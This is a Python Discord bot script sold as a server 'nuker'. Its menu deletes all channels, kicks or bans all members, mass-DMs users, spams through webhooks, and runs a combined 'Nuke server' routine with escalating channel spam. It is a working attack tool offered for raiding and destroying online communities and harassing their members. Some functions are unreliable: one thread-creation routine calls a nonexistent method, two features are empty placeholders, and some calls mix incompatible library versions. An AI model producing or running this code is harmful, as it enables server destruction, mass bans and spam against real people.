import discord
from discord.ext import commands
import asyncio
import random

intents = discord.Intents.default()
intents.members = True
intents.guilds = True
intents.messages = True
intents.message_content = True

bot = commands.Bot(command_prefix='!', intents=intents)

def print_title():
    title = """
\033[92m
  _____  _   _  _   _  _   _  _  __   _  _  __  _  
 / ____|| \ | || \ | || \ | || ||  \ | || |/ / | | 
| |     |  \| ||  \| ||  \| || ||   \| || ' /  | | 
| |     | . ` || . ` || . ` || || . ` ||  <   | | 
| |____ | |\  || |\  || |\  || || |\  || . \  | |____
 \_____| |_| \_||_| \_||_| \_||_||_| \_||_|\_\ |______|
\033[0m
\033[92mMade by Zino\033[0m
"""
    print(title)

def get_bot_token_and_server_id():
    bot_token = input("Please enter your Bot Token: ")
    server_id = int(input("Please enter the Server ID: "))
    return bot_token, server_id

@bot.event
async def on_ready():
    print(f"\033[92mLogged in as {bot.user.name}\033[0m")
    await menu()

async def menu():
    print("\033[92m" + """
┌─────────────────────────────────────────────────────────┐
│ [ 1] Delete all channels       │ [11] Rename server       │
│ [ 2] Create channels           │ [12] Mass create threads │
│ [ 3] Create roles              │ [13] Webhook spammer     │
│ [ 4] Add webhooks              │ [14] Delete webhook      │
│ [ 5] Kick all members          │ [15] Delete all webhooks │
│ [ 6] Ban all members           │ [16] Server info         │
│ [ 7] Unban all members         │ [17] Rename all members  │
│ [ 8] Copy server               │ [18] Execute script      │
│ [ 9] DM all members            │ [19] Nuke server         │
│ [10] Create/delete channels    │                          │
└─────────────────────────────────────────────────────────┘
\033[0m
    """)

    try:
        option = int(input("\033[92mSelect an option (1-19): \033[0m"))
    except ValueError:
        print("\033[91mInvalid option. Please try again.\033[0m")
        await menu()
        return

    guild = bot.get_guild(server_id)
    if guild is None:
        print(
            f"\033[91mThe bot is not connected to the server with ID {server_id}. Please check your Server ID.\033[0m"
        )
        return

    # Map options to functions
    actions = {
        1: delete_all_channels,
        2: create_channels,
        3: create_roles,
        4: add_webhooks,
        5: kick_all_members,
        6: ban_all_members,
        7: unban_all_members,
        8: copy_server,
        9: dm_all_members,
        10: create_and_delete_channels,
        11: rename_server,
        12: mass_create_threads,
        13: webhook_spammer,
        14: delete_webhook,
        15: delete_all_webhooks,
        16: server_info,
        17: rename_all_members,
        18: custom_script,
        19: nuke_server
    }

    action = actions.get(option)
    if action:
        await action(guild)
    else:
        print("\033[91mInvalid option. Please try again.\033[0m")
        await menu()

async def delete_all_channels(guild):
    print("\033[92m[ Deleting all channels... ]\033[0m")
    for channel in guild.channels:
        try:
            await channel.delete()
            print(f"Deleted channel: {channel.name}")
        except discord.errors.HTTPException as e:
            print(f"Could not delete channel: {channel.name} (Reason: {str(e)})")
    await menu()

async def create_channels(guild):
    channel_name = input("Enter name for channels: ")
    try:
        channel_count = int(input("How many channels to create: "))
    except ValueError:
        print("\033[91mInvalid number of channels. Please enter a valid integer.\033[0m")
        await create_channels(guild)
        return

    print(f"\033[92m[ Creating {channel_count} channels... ]\033[0m")
    for _ in range(channel_count):
        await guild.create_text_channel(f"{channel_name}-{random.randint(1000, 9999)}")
    print(f"Created {channel_count} channels.")
    await menu()

async def create_roles(guild):
    role_name = input("Enter name for roles: ")
    try:
        role_count = int(input("How many roles to create: "))
    except ValueError:
        print("\033[91mInvalid number of roles. Please enter a valid integer.\033[0m")
        await create_roles(guild)
        return

    print(f"\033[92m[ Creating {role_count} roles... ]\033[0m")
    for _ in range(role_count):
        await guild.create_role(name=role_name)
    print(f"Created {role_count} roles.")
    await menu()

async def add_webhooks(guild):
    webhook_name = input("Enter name for webhooks: ")
    try:
        webhook_count = int(input("How many webhooks to create per channel: "))
    except ValueError:
        print("\033[91mInvalid number of webhooks. Please enter a valid integer.\033[0m")
        await add_webhooks(guild)
        return

    print(f"\033[92m[ Adding {webhook_count} webhooks to each channel... ]\033[0m")
    for channel in guild.text_channels:
        for _ in range(webhook_count):
            await channel.create_webhook(name=f"{webhook_name}-{random.randint(1000, 9999)}")
    print("Added webhooks to channels.")
    await menu()

async def kick_all_members(guild):
    print("\033[92m[ Kicking all members... ]\033[0m")
    for member in guild.members:
        if member != guild.owner:
            try:
                await member.kick(reason='Kicked by bot')
                print(f"Kicked {member.name}")
            except discord.errors.Forbidden:
                print(f"Cannot kick {member.name}")
    await menu()

async def ban_all_members(guild):
    print("\033[92m[ Banning all members... ]\033[0m")
    for member in guild.members:
        if member != guild.owner:
            try:
                await member.ban(reason='Banned by bot')
                print(f"Banned {member.name}")
            except discord.errors.Forbidden:
                print(f"Cannot ban {member.name}")
    await menu()

async def unban_all_members(guild):
    print("\033[92m[ Unbanning all members... ]\033[0m")
    banned_users = await guild.bans()
    for ban_entry in banned_users:
        user = ban_entry.user
        try:
            await guild.unban(user)
            print(f"Unbanned {user.name}")
        except discord.errors.Forbidden:
            print(f"Cannot unban {user.name}")
    await menu()

async def copy_server(guild):
    invite_link = input("Please enter the invite link of the server to copy from: ")
    print(f"Copying server from {invite_link} to {guild.name}...")
    # Placeholder for server copying functionality
    await menu()

async def dm_all_members(guild):
    message = input("Enter message to send to all members: ")
    try:
        message_count = int(input("How many messages to send: "))
    except ValueError:
        print("\033[91mInvalid number of messages. Please enter a valid integer.\033[0m")
        await dm_all_members(guild)
        return

    print(f"\033[92m[ Sending {message_count} messages to each member... ]\033[0m")
    for member in guild.members:
        if member != bot.user:
            try:
                for _ in range(message_count):
                    await member.send(message)
                    print(f"Sent message to {member.name}")
            except discord.errors.Forbidden:
                print(f"Cannot send message to {member.name}")
    await menu()

async def create_and_delete_channels(guild):
    channel_name = input("Enter base name for channels: ")
    try:
        repeat_count = int(input("How many times to repeat create/delete: "))
    except ValueError:
        print("\033[91mInvalid number of repetitions. Please enter a valid integer.\033[0m")
        await create_and_delete_channels(guild)
        return

    for _ in range(repeat_count):
        print(f"\033[92m[ Creating and deleting channels (iteration {_ + 1})... ]\033[0m")
        new_channel = await guild.create_text_channel(f"{channel_name}-{random.randint(1000, 9999)}")
        await new_channel.delete()
    print("Completed creating and deleting channels.")
    await menu()

async def rename_server(guild):
    new_name = input("Enter new server name: ")
    await guild.edit(name=new_name)
    print(f"Server renamed to {new_name}")
    await menu()

async def mass_create_threads(guild):
    thread_name = input("Enter base name for threads: ")
    try:
        thread_count = int(input("How many threads to create per channel: "))
    except ValueError:
        print("\033[91mInvalid number of threads. Please enter a valid integer.\033[0m")
        await mass_create_threads(guild)
        return

    print(f"\033[92m[ Creating {thread_count} threads in each channel... ]\033[0m")
    for channel in guild.text_channels:
        for _ in range(thread_count):
            await channel.create_text_channel(f"{thread_name}-{random.randint(1000, 9999)}")
    print("Created threads in channels.")
    await menu()

async def webhook_spammer(guild):
    webhook_url = input("Enter the webhook URL: ")
    message = input("Enter the message to send: ")
    try:
        message_count = int(input("How many messages to send: "))
    except ValueError:
        print("\033[91mInvalid number of messages. Please enter a valid integer.\033[0m")
        await webhook_spammer(guild)
        return

    print(f"\033[92m[ Sending {message_count} messages via webhook... ]\033[0m")
    webhook = discord.Webhook.from_url(webhook_url, adapter=discord.RequestsWebhookAdapter())
    for _ in range(message_count):
        webhook.send(message)
        print("Message sent via webhook.")
    await menu()

async def delete_webhook(guild):
    webhook_id = input("Enter the ID of the webhook to delete: ")
    try:
        webhook = await guild.fetch_webhook(webhook_id)
        await webhook.delete()
        print(f"Deleted webhook with ID {webhook_id}")
    except discord.errors.NotFound:
        print(f"Webhook with ID {webhook_id} not found.")
    await menu()

async def delete_all_webhooks(guild):
    print("\033[92m[ Deleting all webhooks... ]\033[0m")
    for channel in guild.text_channels:
        webhooks = await channel.webhooks()
        for webhook in webhooks:
            await webhook.delete()
            print(f"Deleted webhook: {webhook.name}")
    await menu()

async def server_info(guild):
    print(f"Server name: {guild.name}")
    print(f"Total members: {guild.member_count}")
    print(f"Total channels: {len(guild.channels)}")
    await menu()

async def rename_all_members(guild):
    new_name = input("Enter new name for all members: ")
    print(f"\033[92m[ Renaming all members to {new_name}... ]\033[0m")
    for member in guild.members:
        if member != bot.user:
            try:
                await member.edit(nick=new_name)
                print(f"Renamed {member.name} to {new_name}")
            except discord.errors.Forbidden:
                print(f"Cannot rename {member.name}")
    await menu()

async def custom_script(guild):
    print("Executing custom script...")
    # Add your custom script logic here
    await menu()

async def nuke_server(guild):
    # Collect inputs
    delete_channels = input("Delete all channels? (Y/N): ").strip().upper()
    create_channels = input("Create massive channels? (Y/N): ").strip().upper()
    if create_channels == 'Y':
        try:
            channel_count = int(input("How many channels to create: "))
            channel_name = input("Enter base name for channels: ")
        except ValueError:
            print("\033[91mInvalid number of channels. Please enter a valid integer.\033[0m")
            await nuke_server(guild)  # Restart nuke process
            return
    send_spam = input("Send spam messages to all channels? (Y/N): ").strip().upper()
    if send_spam == 'Y':
        try:
            message = input("Enter text to send: ")
            max_spam_count = int(input("How many steps to spam (e.g., 1, 2, 3, ...): "))
        except ValueError:
            print("\033[91mInvalid number of steps. Please enter a valid integer.\033[0m")
            await nuke_server(guild)  # Restart nuke process
            return
    rename_server = input("Rename server? (Y/N): ").strip().upper()
    if rename_server == 'Y':
        new_name = input("Enter new server name: ")
    rename_members = input("Rename all members? (Y/N): ").strip().upper()
    if rename_members == 'Y':
        new_name_for_members = input("Enter new name for all members: ")
    dm_members = input("DM all members? (Y/N): ").strip().upper()
    if dm_members == 'Y':
        message_for_dm = input("Enter message to send to all members: ")
        try:
            message_count_for_dm = int(input("How many messages to send: "))
        except ValueError:
            print("\033[91mInvalid number of messages. Please enter a valid integer.\033[0m")
            await nuke_server(guild)  # Restart nuke process
            return

    # Execute actions
    if delete_channels == 'Y':
        print("\033[92m[ Deleting all channels... ]\033[0m")
        for channel in guild.channels:
            try:
                await channel.delete()
                print(f"Deleted channel: {channel.name}")
            except discord.errors.HTTPException as e:
                print(f"Could not delete channel: {channel.name} (Reason: {str(e)})")
    
    if create_channels == 'Y':
        print(f"\033[92m[ Creating {channel_count} channels... ]\033[0m")
        for _ in range(channel_count):
            await guild.create_text_channel(f"{channel_name}-{random.randint(1000, 9999)}")
        print(f"Created {channel_count} channels.")
    
    if send_spam == 'Y':
        print(f"\033[92m[ Spamming channels with increasing message counts... ]\033[0m")
        for step in range(1, max_spam_count + 1):
            print(f"\033[92m[ Spamming with {step} messages per channel ]\033[0m")
            tasks = []
            for channel in guild.text_channels:
                for _ in range(step):
                    tasks.append(channel.send(message))
            await asyncio.gather(*tasks)
            await asyncio.sleep(0.5)  # Wait for 0.5 seconds before sending more messages
    
    if rename_server == 'Y':
        await guild.edit(name=new_name)
        print(f"Server renamed to {new_name}")
    
    if rename_members == 'Y':
        print(f"\033[92m[ Renaming all members to {new_name_for_members}... ]\033[0m")
        for member in guild.members:
            if member != bot.user:
                try:
                    await member.edit(nick=new_name_for_members)
                    print(f"Renamed {member.name} to {new_name_for_members}")
                except discord.errors.Forbidden:
                    print(f"Cannot rename {member.name}")
    
    if dm_members == 'Y':
        print(f"\033[92m[ DMing all members... ]\033[0m")
        for member in guild.members:
            if member != bot.user:
                try:
                    for _ in range(message_count_for_dm):
                        await member.send(message_for_dm)
                        print(f"Sent message to {member.name}")
                except discord.errors.Forbidden:
                    print(f"Cannot send message to {member.name}")

    print("\033[92m[ Nuke complete! ]\033[0m")
    await menu()

bot_token, server_id = get_bot_token_and_server_id()
bot.run(bot_token)
